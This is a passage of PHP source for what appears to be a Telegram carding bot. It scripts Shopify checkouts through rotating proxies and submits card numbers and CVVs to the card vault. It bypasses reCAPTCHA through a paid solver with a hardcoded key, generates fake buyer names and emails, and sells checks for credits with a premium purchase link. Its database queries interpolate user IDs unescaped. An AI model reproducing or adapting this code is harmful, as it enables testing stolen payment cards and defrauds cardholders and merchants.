ails%5D%5Bbrowser_width%5D=1366&checkout%5Bclient_details%5D%5Bbrowser_height%5D=681&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300');
$curl = curl_exec($ch);

goto a;
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_USERAGENT, $ua);
$headers = array();
$headers[] = 'Host: '.$pag_host.'';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Referer: https://'.$pag_host.'/';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://'.$pag_host.'';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
curl_setopt($ch, CURLOPT_TIMEOUT, 60);
curl_setopt($ch, CURLOPT_AUTOREFERER, true);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.urlencode($TOKEN).'&previous_step=contact_information&step=shipping_method&checkout%5Bemail%5D='.urlencode($email).'&checkout%5Bbuyer_accepts_marketing%5D=0&checkout%5Bbuyer_accepts_marketing%5D=1&checkout%5Bshipping_address%5D%5Bfirst_name%5D=&checkout%5Bshipping_address%5D%5Blast_name%5D=&checkout%5Bshipping_address%5D%5Baddress1%5D=&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=&checkout%5Bshipping_address%5D%5Bprovince%5D=&checkout%5Bshipping_address%5D%5Bzip%5D=&checkout%5Bshipping_address%5D%5Bphone%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D='.urlencode($country).'&checkout%5Bshipping_address%5D%5Bfirst_name%5D='.$firstname.'&checkout%5Bshipping_address%5D%5Blast_name%5D='.$lastname.'&checkout%5Bshipping_address%5D%5Baddress1%5D='.urlencode($street).'&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D='.urlencode($city).'&checkout%5Bshipping_address%5D%5Bprovince%5D='.$regioncode.'&checkout%5Bshipping_address%5D%5Bzip%5D='.$zip.'&checkout%5Bshipping_address%5D%5Bphone%5D='.urlencode($phone).'&checkout%5Bremember_me%5D=&checkout%5Bremember_me%5D=0&checkout%5Bclient_details%5D%5Bbrowser_width%5D=1366&checkout%5Bclient_details%5D%5Bbrowser_height%5D=681&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300');
$curl = curl_exec($ch);

a:

$TOKEN = GetStr($curl, 'authenticity_token" value="', '"');
$shipping_method = getStr($curl, '<div class="radio-wrapper" data-shipping-method="', '"');


if($TOKEN == "null"|| $shipping_method== "null"){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_PROXY, $socks5);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
    curl_setopt($ch, CURLOPT_URL, "$url?previous_step=contact_information&step=shipping_method");
    curl_setopt($ch, CURLOPT_USERAGENT, $ua);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    $headers = array();
    $headers[] = 'Host: '.$pag_host.'';
    $headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_AUTOREFERER, true);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
    $curl = curl_exec($ch);
    $TOKEN = GetStr($curl, 'authenticity_token" value="', '"');
    $shipping_method = getStr($curl, '<div class="radio-wrapper" data-shipping-method="', '"');
}if($TOKEN == "null"|| $shipping_method== "null"){

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_PROXY, $socks5);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
    curl_setopt($ch, CURLOPT_URL, "$url/shipping_rates?step=shipping_method");
    curl_setopt($ch, CURLOPT_USERAGENT, $ua);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    $headers = array();
    $headers[] = 'Host: '.$pag_host.'';
    $headers[] = 'Accept: */*';
    $headers[] = 'Referer: https://'.$pag_host.'/';
    $headers[] = 'X-Requested-With: XMLHttpRequest';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_AUTOREFERER, true);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
    $curl = curl_exec($ch);
    
    sleep(3); 
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_PROXY, $socks5);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
    curl_setopt($ch, CURLOPT_URL, "$url/shipping_rates?step=shipping_method");
    curl_setopt($ch, CURLOPT_USERAGENT, $ua);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    $headers = array();
    $headers[] = 'Host: '.$pag_host.'';
    $headers[] = 'Referer: https://'.$pag_host.'/';
    $headers[] = 'X-Requested-With: XMLHttpRequest';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_AUTOREFERER, true);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
    $curl = curl_exec($ch);
    $TOKEN = GetStr($curl, 'authenticity_token" value="', '"');
    $shipping_method = getStr($curl, '<div class="radio-wrapper" data-shipping-method="', '"');
}

//TOKEN: $TOKEN \n shipping_method : $shipping_method";

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_USERAGENT, $ua);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: '.$pag_host.'';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Referer: https://'.$pag_host.'/';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://'.$pag_host.'';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
curl_setopt($ch, CURLOPT_TIMEOUT, 60);
curl_setopt($ch, CURLOPT_AUTOREFERER, true);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.urlencode($TOKEN).'&previous_step=shipping_method&step=payment_method&checkout%5Bshipping_rate%5D%5Bid%5D='.urlencode($shipping_method).'&checkout%5Bclient_details%5D%5Bbrowser_width%5D=506&checkout%5Bclient_details%5D%5Bbrowser_height%5D=681&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300');
$curl = curl_exec($ch);
$total = GetStr($curl, 'data-checkout-payment-due-target="', '"');
$payment_gateway = getStr($curl, 'payment_gateway_', '"');

if($total == "null" OR $payment_gateway == "null"){
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, "$url?step=payment_method");
curl_setopt($ch, CURLOPT_USERAGENT, $ua);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'Host: '.$pag_host.'';
$headers[] = 'Referer: https://'.$pag_host.'/';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
curl_setopt($ch, CURLOPT_TIMEOUT, 60);
curl_setopt($ch, CURLOPT_AUTOREFERER, true);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
$curl = curl_exec($ch);
$total = GetStr($curl, 'data-checkout-payment-due-target="', '"');
$payment_gateway = getStr($curl, 'payment_gateway_', '"');
}

//total: $total \n payment_gateway : $payment_gateway";

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://deposit.us.shopifycs.com/sessions');
curl_setopt($ch, CURLOPT_USERAGENT, $ua);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: deposit.us.shopifycs.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0';
$headers[] = 'Accept: application/json';
$headers[] = 'Referer: https://checkout.shopifycs.com/';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Origin: https://checkout.shopifycs.com';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
curl_setopt($ch, CURLOPT_TIMEOUT, 60);
curl_setopt($ch, CURLOPT_AUTOREFERER, true);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"credit_card":{"number":"'.$cc.'","name":"'.$firstname.' '.$lastname.'","month":'.$mes.',"year":'.$ano.',"verification_value":"'.$cvv.'"},"payment_session_scope":"'.$pag_host.'"}');
$curl = curl_exec($ch);
$id_sh = getStr($curl, '"id":"', '"');
//id_sh: $id_sh \n";

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: '.$pag_host.'';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Referer: https://'.$pag_host.'/';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://'.$pag_host.'';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
curl_setopt($ch, CURLOPT_TIMEOUT, 60);
curl_setopt($ch, CURLOPT_AUTOREFERER, true);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.$TOKEN.'&previous_step=payment_method&step=&s='.$id_sh.'&checkout%5Bpayment_gateway%5D='.$payment_gateway.'&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bdifferent_billing_address%5D=false&checkout%5Btotal_price%5D='.$total.'&checkout_submitted_request_url=&checkout_submitted_page_id=&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=506&checkout%5Bclient_details%5D%5Bbrowser_height%5D=681&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300');
$curl = curl_exec($ch);
sleep(5);

if(substr_count($curl, "grecaptcha.render")){
//Procesando solution...";
$SITEKEY = GetStr($curl, 'sitekey: "', '"');
$cursl = GetStr($curl, 'var recaptchaCallback = function() {', '//]]>');
$s = GetStr($cursl, "s: '", "'");


$data = [
    'clientKey' => 'CAP-5361C0C774F336BECC410D69E869566E',
    'task' => [
        'type' => 'ReCaptchaV2EnterpriseTaskProxyLess',
        'websiteURL' => $url,
        "websiteKey" => $SITEKEY,
        'enterprisePayload' =>  [
            "s" => $s
      ],
    ],
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.capsolver.com/createTask');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER,  [
    'Host: api.capsolver.com',
    'Content-Type: application/json'
]);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
$curl = curl_exec($ch);
$js = json_decode($curl, true);
$taskId = $js["taskId"];

while (true) {

sleep(2);

$data = [
    'clientKey' => '',
    'taskId' => $taskId,
];


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.capsolver.com/getTaskResult');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER,  [
    'Host: api.capsolver.com',
    'Content-Type: application/json'
]);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
$curl = curl_exec($ch);
$js = json_decode($curl, true);
$status = $js["status"];

if ($status != "processing") {
    break;
}
}

$captcha = $js["solution"]['gRecaptchaResponse'];
//\n";
//Finish ... recaptcha";
//\n";
//gRecaptchaResponse : $captcha";
//\n";

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_USERAGENT, $ua);
$headers = array();
$headers[] = 'Host: '.$pag_host.'';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Referer: https://'.$pag_host.'/';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://'.$pag_host.'';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
curl_setopt($ch, CURLOPT_TIMEOUT, 60);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.$TOKEN.'&previous_step=payment_method&step=&s=&checkout%5Bpayment_gateway%5D='.$payment_gateway.'&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bdifferent_billing_address%5D=false&g-recaptcha-response='.$captcha.'&checkout%5Btotal_price%5D='.$total.'&checkout_submitted_request_url=&checkout_submitted_page_id=&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=506&checkout%5Bclient_details%5D%5Bbrowser_height%5D=681&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300');
$curl = curl_exec($ch);

}

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, "$url/processing");
curl_setopt($ch, CURLOPT_USERAGENT, $ua);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'Host: '.$pag_host.'';
$headers[] = 'Accept: */*';
$headers[] = 'Referer: https://'.$pag_host.'/';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
$curl = curl_exec($ch);

sleep(1);


$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, "$url/processing?from_processing_page=1");
curl_setopt($ch, CURLOPT_USERAGENT, $ua);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'Host: '.$pag_host.'';
$headers[] = 'Accept: */*';
$headers[] = 'Referer: https://'.$pag_host.'/';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
$curl = curl_exec($ch);
sleep(3);

return $curl;
}



function generarPassword($longitud) {
  $caracteres = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
  $password = '';
  for ($i = 0; $i < $longitud; $i++) {
    $password .= $caracteres[rand(0, strlen($caracteres) - 1)];
  }
  return $password;
}
// Ejemplo de uso para generar una contraseña de 8 caracteres
function forward_message_to_all_groups($message_id) {

    global $roles;

    $query = "SELECT iduser FROM userpublic";
    $result = $roles->query($query);

    // Loop through the result and forward the message to each group
    while ($row = $result->fetch_assoc()) {
        $chatId = $row['iduser'];
        bot('forwardMessage', [
            'chat_id' => $chatId,
            'from_chat_id' => -1001963171571, // assumes the original message was sent in the same group
            'message_id' => $message_id,
        ]);
    }

    // Close the database connection
}
function generar_correo_aleatorio() {
  $nombre = generar_nombre_aleatorio();
  $proveedores = array('gmail.com', 'hotmail.com');
  $proveedor = $proveedores[array_rand($proveedores)];
  $correo = strtolower($nombre) . '@' . $proveedor;
  return $correo;
}  




function ProxyStateR_S() {
    global $socks5, $rotate, $chatId, $messageidtoedit, $message_id; 
    
    $url = "https://httpbin.org/ip"; 
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_PROXY, $socks5);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    
    $ip1 = curl_exec($ch); 
    if (empty($ip1)) { 
        bot('editMessageText', [
            'chat_id' => $chatId,
            'message_id' => $messageidtoedit,
            'text' => "<b>Proxy Dead⚠️</b>",
            'parse_mode' => 'html',
            'reply_to_message_id' => $message_id
        ]);
        die();   
    }
}



function restarCredito($userId) {
    global $roles;
    $ress = Credis($userId);
    $cre = $ress['creditos'];
    $restacredi = $cre - 3;
    $sql = "UPDATE creditos set creditos = '$restacredi' WHERE userdid = '$userId'";
    $result21 = mysqli_query($roles, $sql);
    $ress = Credis($userId);
    $creditosRestantes = $ress['creditos'];
    return $creditosRestantes;
}

function p_rce($userId, $num) {
    global $roles;
    $ress = Credis($userId);
    $cre = $ress['creditos'];
    $restacredi = $cre - $num;
    $sql = "UPDATE creditos set creditos = '$restacredi' WHERE userdid = '$userId'";
    $result21 = mysqli_query($roles, $sql);
    $ress = Credis($userId);
    $creditosRestantes = $ress['creditos'];
    return $creditosRestantes;
}



function resdead($userId) {
    global $roles;
    $ress = Credis($userId);
    $cre = $ress['creditos'];
    $restacredi = $cre - 1;
    $sql = "UPDATE creditos set creditos = '$restacredi' WHERE userdid = '$userId'";
    $result21 = mysqli_query($roles, $sql);
    $ress = Credis($userId);
    $creditosRestantes = $ress['creditos'];
    return $creditosRestantes;
}
function generar_nombre_aleatorio() {
    $longitud = rand(5, 10); // longitud del nombre entre 5 y 10 caracteres
    $vocales = array('a', 'e', 'i', 'o', 'u');
    $consonantes = array('b', 'c', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'm', 'n', 'p', 'r', 's', 't', 'v', 'w', 'x', 'y', 'z');
    
    $nombre = '';
    
    // Agregar una consonante al inicio
    $nombre .= $consonantes[array_rand($consonantes)];
    
    // Generar la mitad de las letras como consonantes y la otra mitad como vocales
    for ($i = 1; $i < $longitud; $i++) {
      if ($i % 2 == 0) {
        $nombre .= $consonantes[array_rand($consonantes)];
      } else {
        $nombre .= $vocales[array_rand($vocales)];
      }
    }
    
    // Convertir la primera letra en mayúscula
    $nombre = ucfirst($nombre);
    
    return $nombre;
  }
function roles($user){ 
    global $roles; 
    $rolesu = "SELECT `roles` FROM `userrita` WHERE `useid`= '$user'"; 
    $res = mysqli_query($roles, $rolesu); 
    if (mysqli_num_rows($res) != 0) { 
        while ($fila = mysqli_fetch_array ($res)) { 
            return $fila['roles'];
        }
    }else{
        return False;
    }
}
function checkCardType($cardNumber) {
    global $keyboard; global $message_id; global $chatId;
  // Eliminamos los espacios en blanco y los guiones del número de la tarjeta
  $cardNumber = str_replace(array(' ', '-'), '', $cardNumber);
  
  // Definimos un array con los prefijos de los diferentes tipos de tarjeta
  $cardTypes = array(
    'visa' => '/^4[0-9]{12}(?:[0-9]{3})?$/',
    'mastercard' => '/^5[1-5][0-9]{14}$/',
    'amex' => '/^3[47][0-9]{13}$/',
    'discover' => '/^6(?:011|5[0-9]{2})[0-9]{12}$/'
  );
  
  // Recorremos el array de prefijos y verificamos si el número de la tarjeta coincide con alguno de ellos
  foreach($cardTypes as $cardType => $pattern) {
    if(preg_match($pattern, $cardNumber)) {
      return $cardType;
    }
  }
  
  // Si no se encuentra ningún prefijo que coincida, devolvemos "unknown"
  return reply_to($chatId, $message_id,$keyboard,'<b>Este bot solo soporta Amex, Visa, MasterCard y Discover.</b>');
}
#------------------------------------------------------------------------------#

        
#------------------------------------------------------------------------------#
function is_registerv(){
    global $userId,$message_id,$chatId;
    if (true != FreeUserRegister($userId) && true != verifiAdmin($userId) && true != veritimepremium($userId)) {
        bot('sendMessage', [
            'chat_id' => $chatId,
            'reply_to_message_id' => $message_id,
            'parse_mode' => 'HTML',
            'text' => "<b>No estás registrado, usa el comando /register</b>"
        ]);
        die(); // Opcional: puedes decidir si quieres detener la ejecución después de mostrar el mensaje.
    }
}
        
        
function IS_BANNED($userId, $chatId, $message_id) {
    if ($userId == verifniBan($userId)) {
        reply_to($chatId,$message_id,$keyboard,"<b>You are Banned from the bot: $userId</b>");
        die();
    }
}
        
#------------------------------------------------------------------------------#
function is_bin_banned(){
    global $lista,$message_id,$chatId;
    $bin = clea_cc(substr($lista, 0,6));
    $bines = bannedbin($bin);
    if($bines == true){
        bot('sendMessage', [
                'chat_id' =>$chatId,
    'reply_to_message_id'=>$message_id,
    'parse_mode'=>'HTML',
                'text' =>"<b>Bin Banned</b>"
                ]);       
        die();
    }
}
#------------------------------------------------------------------------------#
function is_bin_ban_userbot(){
    global $userId,$message_id,$chatId;
    if(true == verifniBan($userId)){
        bot('sendMessage', [
                'chat_id' =>$chatId,
    'reply_to_message_id'=>$message_id,
    'parse_mode'=>'HTML',
                'text' =>"<b>You are currently banned from the bot</b>."
                ]);       
        die();
    }
}
#------------------------------------------------------------------------------#
function is_valid_card_type($cc, $chatId, $message_id, $keyboard){
    $chem = substr($cc, 0, 1);
    $vaut = array(1, 2, 7, 8, 9, 0);
    if (in_array($chem, $vaut)) { 
        reply_to($chatId, $message_id, $keyboard, '<b>Este bot solo soporta Amex, Visa, MasterCard y Discover.</b>');
        exit();
        return false;
    } else {
        return true;
    }
}
#------------------------------------------------------------------------------#
function is_freeuser(){
    global $userId; global $Mi_Id; global $message_id; global $chatId;
    if(true != verifiCharAdmin($chatId) AND true != verifiPremium($userId) AND true != verifiAdmin($userId)  AND true != veritimepremium($userId) AND $userId != $Mi_Id){
      bot('sendMessage', [
                'chat_id' =>$chatId,
    'reply_to_message_id'=>$message_id,
    'parse_mode'=>'HTML',
                'text' =>"<b>Exclusive command for premium</b>",
                'reply_markup'=> json_encode(['inline_keyboard'=>[
                    [['text'=>"Buy",'url'=>"https://t.me/NovaStranger"]]
                    ],'resize_keyboard'=>true])
                ]);       
    die();
            }
}
function is_premium(){
    global $userId; global $Mi_Id; global $message_id; global $chatId;
    if (true != verifiPremium($userId) AND true != verifiAdmin($userId) AND true != veritimepremium($userId) AND $userId != $Mi_Id) {
      bot('sendMessage', [
                'chat_id' =>$chatId,
    'reply_to_message_id'=>$message_id,
    'parse_mode'=>'HTML',
                'text' =>"<b>Exclusive command for premium</b>",
                'reply_markup'=> json_encode(['inline_keyboard'=>[
                    [['text'=>"Buy",'url'=>"https://t.me/NovaStranger"]]
                    ],'resize_keyboard'=>true])
                ]);       
    die();
            }
        }
        
        
function AntiScript() {
    global $userId, $timestamp, $telegram, $chatId;
    $max_messages = 4; 
    $time_window = 15; 
    $reset_window = 4; 
    $file_path = "UserAntscript/user_{$userId}.txt";

    if (file_exists($file_path)) {
        $message_times = explode("\n", file_get_contents($file_path));
        $message_times = array_map('intval', $message_times); // Asegurarse de que los tiempos son enteros
    } else {
        $message_times = [];
    }

    $message_times = array_filter($message_times, function($time) use ($timestamp, $time_window) {
        return $time > $timestamp - $time_window;
    });

    $message_times[] = $timestamp;

    file_put_contents($file_path, implode("\n", $message_times));

    if (count($message_times) > 0 && $timestamp - $message_times[count($message_times) - 1] >= $reset_window) {
        unlink($file_path); // Borrar el archivo si la ventana de reseteo se cumple
        $message_times = [$timestamp]; // Reiniciar los tiempos de mensajes
    }

    $message_count = count($message_times);

    if ($message_count >= $max_messages) {
        $text = "Script detectado! userid : $userId";
